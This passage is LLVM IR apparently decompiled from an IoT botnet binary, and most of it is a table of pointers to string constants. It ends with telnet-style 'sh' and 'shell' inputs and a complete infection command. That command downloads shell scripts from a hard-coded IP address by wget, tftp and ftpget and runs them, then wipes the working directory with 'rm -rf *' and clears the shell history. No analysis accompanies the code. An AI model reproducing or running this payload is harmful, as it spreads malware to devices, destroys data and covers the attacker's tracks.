@global_var_185f0.143, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_185f8.144, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18600.145, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18608.146, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18614.147, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1861c.148, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18628.149, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18634.150, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18640.151, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1864c.152, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18654.153, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18660.154, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1866c.155, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18678.156, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18680.157, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1868c.158, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18698.159, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_186a4.160, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_186ac.161, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18698.159, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_186b4.162, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_186c8.163, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_186a4.160, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18454.102, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_186d0.164, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_186d8.165, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_186e0.166, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_186ec.167, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_186f4.168, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_186fc.169, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1870c.170, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_184a0.110, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18714.171, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18720.172, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18728.173, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18730.174, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18738.175, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18738.175, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18740.176, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18748.177, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18754.178, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18760.179, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18768.180, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18774.181, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1877c.182, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1878c.183, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1879c.184, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_187a8.185, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_187b4.186, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_187c0.187, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_187d0.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_184a0.110, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_187dc.189, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_187e8.190, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_187f4.191, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_187fc.192, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18808.193, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18454.102, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18814.194, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18820.195, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1882c.196, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18834.197, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18840.198, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18848.199, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18854.200, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18860.201, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18868.202, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18870.203, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18878.204, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18884.205, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18890.206, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18898.207, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_188a0.208, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_188a8.209, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_188b4.210, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_188c4.211, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_188d4.212, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_188dc.213, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_188e8.214, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18478.106, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_188f8.215, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18908.216, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18914.217, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18920.218, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1892c.219, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18698.159, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18938.220, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18940.221, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_18948.222, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18958.223, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18968.224, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18970.225, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18978.226, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18984.227, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18984.227, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1898c.228, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18994.229, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_189a0.230, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_189a8.231, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_189b0.232, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_189b8.233, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_189c4.234, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_189d0.235, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_189dc.236, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_189e8.237, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_189f8.238, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_189fc.239, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18a0c.240, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18908.216, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18a18.241, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18a24.242, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_18a30.243, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18a34.244, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18a40.245, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18a4c.246, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18a58.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18a64.248, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18a6c.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18520.123, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18a78.250, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18a80.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_184a0.110, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_185e8.142, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18a88.252, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18a94.253, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18aa0.254, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18aa0.254, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18aa0.254, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18aa0.254, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18aac.255, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18ab8.256, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_18ac4.257, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18ad4.258, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18ae0.259, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18ae8.260, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18af4.261, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18afc.262, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18b08.263, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18b14.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18b20.265, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18b28.266, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18b30.267, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18b3c.268, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18b48.269, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_188e8.214, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18b50.270, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18b5c.271, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18b68.272, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18b74.273, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18b80.274, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18b80.274, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18b8c.275, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18b8c.275, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18b94.276, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18ba0.277, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18bac.278, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18bb4.279, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18bc0.280, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18bc8.281, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18bd4.282, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18be0.283, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18444.100, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18bec.284, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18bf4.285, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18c00.286, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18488.108, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18c08.287, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18c08.287, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18c10.288, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18c18.289, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18c20.290, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18c28.291, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_18c34.292, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18c44.293, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18c50.294, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18c60.295, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18c70.296, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18c78.297, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18c84.298, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18480.107, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18c8c.299, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18c94.300, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18c9c.301, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_18ca4.302, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18cb4.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18cc0.304, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_184b0.112, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18cc8.305, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18478.106, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18cd0.306, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18c10.288, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18cd8.307, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18ce0.308, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18cf0.309, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18ce0.308, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_18cf0.309, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18d00.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18d08.311, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18d10.312, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1870c.170, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18d1c.313, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18d28.314, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18d30.315, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18d3c.316, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18d48.317, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18d54.318, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18d60.319, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18d68.320, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18d74.321, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18d7c.322, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18d88.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18d94.324, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18d94.324, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18d9c.325, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_184d8.116, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18da8.326, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18db0.327, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18db8.328, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18dc0.329, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18dcc.330, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18dd4.331, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18ddc.332, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18de4.333, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18cc0.304, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18478.106, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18cd0.306, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18dec.334, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18df8.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18e00.336, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18698.159, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_184b0.112, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18e08.337, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18860.201, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18e10.338, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_184a0.110, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18e18.339, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18e20.340, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18e2c.341, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_18e34.342, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18914.217, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18e3c.343, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18e44.344, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18e4c.345, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18e54.346, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18860.201, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18e60.347, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18e68.348, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18e70.349, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18e78.350, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18504.120, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18454.102, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18df8.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18590.133, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18e84.351, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18984.227, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18e90.352, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18e9c.353, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18e68.348, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18ea8.354, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18460.103, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18eb0.355, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_184a0.110, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_184a0.110, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18eb8.356, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18ec0.357, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_18ec8.358, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18ed4.359, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18ee0.360, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18444.100, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18ee8.361, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18ef4.362, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18f00.363, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18f0c.364, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18f18.365, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_184e4.117, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_18f24.366, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_18f34.367, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18f44.368, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18c44.293, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_18c44.293, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_18f50.369, i32 0, i32 0)]
@global_var_23774.376 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_18fd8.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18fe0.59, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_18fe8.60, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_18ff4.61, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_18ffc.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19004.63, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1900c.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19010.53, i32 0, i32 0), i8* bitcast (i32* @global_var_19018.54 to i8*), i8* bitcast (i32* @global_var_1901c.55 to i8*)]
@global_var_19458.379 = constant i32 993090331
@global_var_194b8.381 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_194c0.383 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_18288.385 = constant [443 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
